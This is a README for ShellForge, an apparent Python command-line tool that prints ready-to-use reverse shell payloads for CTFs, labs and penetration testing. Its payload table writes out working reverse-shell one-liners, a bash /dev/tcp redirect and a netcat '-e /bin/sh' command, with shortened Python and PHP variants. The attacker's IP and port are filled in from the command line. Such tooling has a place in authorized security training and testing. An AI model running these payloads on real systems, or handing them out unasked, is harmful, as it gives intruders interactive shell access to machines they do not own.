## 📌 Description

**ShellForge** is a clean, simple Python CLI tool that generates reverse shell payloads for CTFs, labs, or pentesting environments.

✨ Features:

- Colorful Rich interface
- ASCII banner & stylized UX
- Auto-injected IP & PORT into payloads
- Works fully offline

---

## 🚀 Usage

```bash
python3 payloadgen.py <IP> <PORT>
```

### 🔍 Example

```bash
python3 payloadgen.py 10.10.14.5 4444
```

You will see a menu like:

```
1. Bash TCP
2. Python TCP
3. Netcat (traditional)
4. PHP
5. Exit
```

Select an option and the ready-to-use payload will be printed.

## 🎯 Payload Types

| Option | Language | Payload |
|--------|----------|---------|
| 1 | Bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| 2 | Python | `python3 -c 'import os,socket,...'` |
| 3 | Netcat | `nc IP PORT -e /bin/sh` |
| 4 | PHP | `php -r '$sock=fsockopen("IP",PORT);exec(...)'` |

IP and PORT are automatically injected from the CLI.
